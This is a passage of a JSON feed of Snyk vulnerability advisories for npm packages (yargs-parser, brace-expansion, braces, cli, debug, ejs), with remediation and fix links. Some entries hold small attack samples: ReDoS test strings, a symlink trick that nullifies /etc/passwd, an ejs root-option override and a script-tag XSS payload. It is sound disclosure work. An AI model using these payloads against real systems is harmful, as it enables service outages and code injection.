`eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `yargs-parser` to version 5.0.1, 13.1.2, 15.0.1, 18.1.1 or higher.\n## References\n- [Command Injection PoC](https://gist.github.com/Kirill89/dcd8100d010896157a36624119439832)\n- [GitHub Fix Commit](https://github.com/yargs/yargs-parser/commit/63810ca1ae1a24b08293a4d971e70e058c7a41e2)\n- [Snyk Research Blog](https://snyk.io/blog/prototype-pollution-minimist/)\n",
        "created_at": "2020-03-16T16:41:36Z",
        "updated_at": "2024-03-11T09:53:51Z",
        "problems": [
          {
            "id": "CVE-2020-7608",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.0.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.0.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<5.0.1,>=6.0.0 <13.1.2,>=14.0.0 <15.0.1,>=16.0.0 <18.1.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.6,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2020-03-16T16:35:35Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-03-16T16:35:33Z",
            "references": [
              {
                "url": "https://gist.github.com/Kirill89/dcd8100d010896157a36624119439832",
                "title": "Command Injection PoC"
              },
              {
                "url": "https://github.com/yargs/yargs-parser/commit/63810ca1ae1a24b08293a4d971e70e058c7a41e2",
                "title": "GitHub Fix Commit"
              },
              {
                "url": "https://snyk.io/blog/prototype-pollution-minimist/",
                "title": "Snyk Research Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:brace-expansion:20170302",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\r\n[`brace-expansion`](https://www.npmjs.com/package/brace-expansion) is a package that performs brace expansion as known from sh/bash.\r\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## Remediation\r\nUpgrade `brace-expansion` to version 1.1.7 or higher.\r\n\r\n## References\r\n- [GitHub PR](https://github.com/juliangruber/brace-expansion/pull/35)\r\n- [GitHub Issue](https://github.com/juliangruber/brace-expansion/issues/33)\r\n- [GitHub Commit](https://github.com/juliangruber/brace-expansion/pull/35/commits/b13381281cead487cbdbfd6a69fb097ea5e456c3)",
        "created_at": "2017-04-26T09:19:21Z",
        "updated_at": "2024-03-11T09:54:00Z",
        "problems": [
          {
            "id": "CVE-2017-18077",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.1.7 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.1.7"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.1.7"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.2,
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2017-03-01T22:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2017-04-26T09:19:21Z",
            "references": [
              {
                "url": "https://github.com/juliangruber/brace-expansion/pull/35/commits/b13381281cead487cbdbfd6a69fb097ea5e456c3",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/juliangruber/brace-expansion/issues/33",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/juliangruber/brace-expansion/pull/35",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:braces:20180219",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[braces](https://www.npmjs.com/package/braces) is a Bash-like brace expansion, implemented in JavaScript.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (`^\\{(,+(?:(\\{,+\\})*),*|,*(?:(\\{,+\\})*),+)\\}`) in order to detects empty braces. This can cause an impact of about 10 seconds matching time for data 50K characters long.\r\n\r\n## Disclosure Timeline\r\n* Feb 15th, 2018 - Initial Disclosure to package owner\r\n* Feb 16th, 2018 - Initial Response from package owner\r\n* Feb 18th, 2018 - Fix issued\r\n* Feb 19th, 2018 - Vulnerability published\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `braces` to version 2.3.1 or higher.\n## References\n- [GitHub Commit](https://github.com/micromatch/braces/commit/abdafb0cae1e0c00f184abbadc692f4eaa98f451)\n",
        "created_at": "2018-02-19T14:36:50Z",
        "updated_at": "2024-03-11T09:53:02Z",
        "problems": [
          {
            "id": "CVE-2018-1109",
            "source": "CVE"
          },
          {
            "id": "CWE-185",
            "source": "CWE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.3.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.3.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.3.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "low",
            "score": 3.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "low",
        "slots": [
          {
            "disclosure_time": "2018-02-19T20:39:06Z",
            "exploit": "Proof of Concept",
            "publication_time": "2018-02-19T16:32:28Z",
            "references": [
              {
                "url": "https://github.com/micromatch/braces/commit/abdafb0cae1e0c00f184abbadc692f4eaa98f451",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:cli:20160615",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Insecure use of /tmp folder",
        "description": "## Overview\r\n[`cli`](https://www.npmjs.com/package/cli) is an npm package used for rapidly building command line apps. \r\n\r\nWhen used in `daemon` mode, the library makes insecure use of two files in the `/tmp/` folder: `/tmp/<app-name>.pid` and `/tmp/<app-name>.log`. These allow an attacker to overwrite files they typically cannot access, but that are accessible by the user running the CLI-using app. This is possible since the `/tmp/` folder is (typically) writeable to all system users, and because the names of the files in question are easily predicted by an attacker.\r\n\r\nNote that while this is a real vulnerability, it relies on functionality (`daemon` mode) which is only supported in very old Node versions (0.8 or older), and so is unlikely to be used by most `cli` users. To avoid any doubt, the fixed version (1.0.0) removes support for this feature entirely.\r\n\r\nThis vulnerability has also been assigned CVE-2016-1000021.\r\n\r\n## Details\r\nFor example, assume user _victim_ occasionally runs a CLI tool called `cli-tool`, which uses the `cli` package.\r\nIf an attacker gains write access to the `/tmp/` folder of that machine (but not the higher permissions _victim_ has), they can create the symbolic link `/tmp/cli-tool.pid -> /home/victim/important-file`. When _victim_ runs `cli-tool`, the `important-file` in victim's root directory will be nullified. If the CLI tool is run as root, the same can be done to nullify `/etc/passwd` and make the system unbootable. \r\n\r\nNote that popular CLI tools have no reason to mask their names, and so attackers can easily guess a long list of tools victims may run by checking the `cli` package [dependents](https://www.npmjs.com/browse/depended/cli).\r\n\r\n## Remediation\r\nUpgrade `cli` to version `1.0.0` or greater, which disables the affected feature.\r\n\r\nFrom the fix release notes:\r\n```\r\nThis feature relies on a beta release (e.g. version 0.5.1) of a Node.js\r\nmodule on npm--one that was superseded by a stable (e.g. version 1.0)\r\nrelease published three years ago [2]. Due to a build-time dependency on\r\nthe long-since deprecated `node-waf` tool, the module at that version\r\ncan only be built for Node.js versions 0.8 and below.\r\n\r\nGiven this, actual usage of this feature is likely very limited. Remove\r\nit completely so the integrity of this module's core functionality can\r\nbe verified.\r\n```\r\n\r\n## References\r\n[1] https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=809252\r\n[2] https://github.com/node-js-libs/cli/commit/fd6bc4d2a901aabe0bb6067fbcc14a4fe3faa8b9",
        "created_at": "2016-06-16T00:00:02Z",
        "updated_at": "2024-03-11T09:46:37Z",
        "problems": [
          {
            "id": "CVE-2016-10538",
            "source": "CVE"
          },
          {
            "id": "CWE-59",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.0.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.0.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.0.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "low",
            "score": 2.8,
            "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N"
          }
        ],
        "effective_severity_level": "low",
        "slots": [
          {
            "disclosure_time": "2015-12-28T18:28:58Z",
            "exploit": "Not Defined",
            "publication_time": "2016-08-27T23:22:22Z",
            "references": [
              {
                "url": "https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=809252",
                "title": "Debian Bug Report"
              },
              {
                "url": "https://github.com/node-js-libs/cli/commit/fd6bc4d2a901aabe0bb6067fbcc14a4fe3faa8b9",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:debug:20170905",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n[debug](https://github.com/visionmedia/debug) is a small debugging utility.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the function `useColors` via manipulation of the `str` argument. \r\nThe vulnerability can cause a very low impact of about 2 seconds of matching time for data 50k characters long.\r\n\r\n**Note:**\r\nCVE-2017-20165 is a duplicate of this vulnerability.\r\n\r\n## PoC\r\n\r\nUse the following regex in the `%o` formatter.\r\n```js\r\n/\\s*\\n\\s*/\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `debug` to version 2.6.9, 3.1.0, 3.2.7, 4.3.1 or higher.\n## References\n- [GitHub Commit](https://github.com/debug-js/debug/commit/b6d12fdbc63b483e5c969da33ea6adc09946b5ac)\n- [GitHub Commit](https://github.com/visionmedia/debug/pull/504/commits/42a6ae0737f9243c80b6d3dbb08a69a7ae2a1061)\n- [GitHub Issue](https://github.com/visionmedia/debug/issues/501)\n- [GitHub PR](https://github.com/visionmedia/debug/pull/504)\n- [GitHub Release Notes 2.6.9](https://github.com/debug-js/debug/releases/tag/2.6.9)\n- [GitHub Release Notes 3.1.0](https://github.com/debug-js/debug/releases/tag/3.1.0)\n",
        "created_at": "2017-09-13T07:55:05Z",
        "updated_at": "2024-03-11T09:53:47Z",
        "problems": [
          {
            "id": "CVE-2017-16137",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.6.9 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.6.9"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=1.0.0 <2.6.9,>=3.0.0 <3.1.0,>=3.2.0 <3.2.7,>=4.0.0 <4.3.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "low",
            "score": 3.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P"
          }
        ],
        "effective_severity_level": "low",
        "slots": [
          {
            "disclosure_time": "2017-09-05T21:00:00Z",
            "exploit": "Proof of Concept",
            "publication_time": "2017-09-26T03:55:05Z",
            "references": [
              {
                "url": "https://github.com/debug-js/debug/commit/b6d12fdbc63b483e5c969da33ea6adc09946b5ac",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/visionmedia/debug/pull/504/commits/42a6ae0737f9243c80b6d3dbb08a69a7ae2a1061",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/visionmedia/debug/issues/501",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/visionmedia/debug/pull/504",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/debug-js/debug/releases/tag/2.6.9",
                "title": "GitHub Release Notes 2.6.9"
              },
              {
                "url": "https://github.com/debug-js/debug/releases/tag/3.1.0",
                "title": "GitHub Release Notes 3.1.0"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:ejs:20161128",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Arbitrary Code Execution",
        "description": "## Overview\r\n[`ejs`](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\r\nAffected versions of the package are vulnerable to _Remote Code Execution_ by letting the attacker under certain conditions control the source folder from which the engine renders include files.\r\nYou can read more about this vulnerability on the [Snyk blog](https://snyk.io/blog/fixing-ejs-rce-vuln).\r\n\r\nThere's also a [Cross-site Scripting](https://snyk.io/vuln/npm:ejs:20161130) & [Denial of Service](https://snyk.io/vuln/npm:ejs:20161130-1) vulnerabilities caused by the same behaviour. \r\n\r\n## Details\r\n`ejs` provides a few different options for you to render a template, two being very similar: `ejs.render()` and `ejs.renderFile()`. The only difference being that `render` expects a string to be used for the template and `renderFile` expects a path to a template file.\r\n\r\nBoth functions can be invoked in two ways. The first is calling them with `template`, `data`, and `options`:\r\n```js\r\nejs.render(str, data, options);\r\n\r\nejs.renderFile(filename, data, options, callback)\r\n```\r\nThe second way would be by calling only the `template` and `data`, while `ejs` lets the `options` be passed as part of the `data`:\r\n```js\r\nejs.render(str, dataAndOptions);\r\n\r\nejs.renderFile(filename, dataAndOptions, callback)\r\n```\r\n\r\nIf used with a variable list supplied by the user (e.g. by reading it from the URI with `qs` or equivalent), an attacker can control `ejs` options. This includes the `root` option, which allows changing the project root for includes with an absolute path.  \r\n\r\n```js\r\nejs.renderFile('my-template', {root:'/bad/root/'}, callback);\r\n```\r\n\r\nBy passing along the root directive in the line above, any includes would now be pulled from `/bad/root` instead of the path intended. This allows the attacker to take control of the root directory for included scripts and divert it to a library under his control, thus leading to remote code execution.\r\n\r\nThe [fix](https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6) introduced in version `2.5.3` blacklisted `root` options from options passed via the `data` object.\r\n\r\n## Disclosure Timeline\r\n- November 27th, 2016 - Reported the issue to package owner.\r\n- November 27th, 2016 - Issue acknowledged by package owner.\r\n- November 28th, 2016 - Issue fixed and version `2.5.3` released.\r\n\r\n## Remediation\r\nThe vulnerability can be resolved by either using the GitHub integration to [generate a pull-request](https://snyk.io/org/projects) from your dashboard or by running `snyk wizard` from the command-line interface.\r\nOtherwise, Upgrade `ejs` to version `2.5.3` or higher.\r\n\r\n## References\r\n- [Snyk Blog](https://snyk.io/blog/fixing-ejs-rce-vuln)\r\n- [Fix commit](https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6)",
        "created_at": "2016-11-28T18:44:12Z",
        "updated_at": "2024-03-11T09:46:36Z",
        "problems": [
          {
            "id": "CVE-2017-1000228",
            "source": "CVE"
          },
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.5.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.5.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.5.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.1,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2016-11-27T22:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2016-11-28T18:44:12Z",
            "references": [
              {
                "url": "https://github.com/mde/ejs/commit/3d447c5a335844b25faec04b1132dbc721f9c8f6",
                "title": "GitHub Commit"
              },
              {
                "url": "https://snyk.io/blog/fixing-ejs-rce-vuln",
                "title": "Snyk Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:ejs:20161130",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Cross-site Scripting (XSS)",
        "description": "## Overview\n[`ejs`](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\nAffected versions of the package are vulnerable to _Cross-site Scripting_ by letting the attacker under certain conditions control and override the `filename` option causing it to render the value as is, without escaping it.\nYou can read more about this vulnerability on the [Snyk blog](https://snyk.io/blog/fixing-ejs-rce-vuln).\n\nThere's also a [Remote Code Execution](https://snyk.io/vuln/npm:ejs:20161128) & [Denial of Service](https://snyk.io/vuln/npm:ejs:20161130-1) vulnerabilities caused by the same behaviour.\n\n## Details\n`ejs` provides a few different options for you to render a template, two being very similar: `ejs.render()` and `ejs.renderFile()`. The only difference being that `render` expects a string to be used for the template and `renderFile` expects a path to a template file.\n\nBoth functions can be invoked in two ways. The first is calling them with `template`, `data`, and `options`:\n```js\nejs.render(str, data, options);\n\nejs.renderFile(filename, data, options, callback)\n```\nThe second way would be by calling only the `template` and `data`, while `ejs` lets the `options` be passed as part of the `data`:\n```js\nejs.render(str, dataAndOptions);\n\nejs.renderFile(filename, dataAndOptions, callback)\n```\n\nIf used with a variable list supplied by the user (e.g. by reading it from the URI with `qs` or equivalent), an attacker can control `ejs` options. This includes the `filename` option, which will be rendered as is when an error occurs during rendering. \n\n```js\nejs.renderFile('my-template', {filename:'<script>alert(1)</script>'}, callback);\n```\n\nThe [fix](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f) introduced in version `2.5.3` blacklisted `root` options from options passed via the `data` object.\n\n## Disclosure Timeline\n- November 28th, 2016 - Reported the issue to package owner.\n- November 28th, 2016 - Issue acknowledged by package owner.\n- December 06th, 2016 - Issue fixed and version `2.5.5` released.\n\n## Remediation\nThe vulnerability can be resolved by either using the GitHub integration to [generate a pull-request](https://snyk.io/org/projects) from your dashboard or by running `snyk wizard` from the command-line interface.\nOtherwise, Upgrade `ejs` to version `2.5.5` or higher.\n\n## References\n- [Snyk Blog](https://snyk.io/blog/fixing-ejs-rce-vuln)\n- [Fix commit](https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f)\n",
        "created_at": "2016-11-28T18:44:12Z",
        "updated_at": "2024-03-11T09:46:33Z",
        "problems": [
          {
            "id": "CVE-2017-1000188",
            "source": "CVE"
          },
          {
            "id": "CWE-79",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.5.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.5.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<2.5.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.9,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2016-11-27T22:00:00Z",
            "exploit": "Not Defined",
            "publication_time": "2016-12-06T15:00:00Z",
            "references": [
              {
                "url": "https://github.com/mde/ejs/commit/49264e0037e313a0a3e033450b5c184112516d8f",
                "title": "GitHub Commit"
              },
              {
                "url": "https://snyk.io/blog/fixing-ejs-rce-vuln",
                "title": "Snyk Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "npm:ejs:20161130-1",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Denial of Service (DoS)",
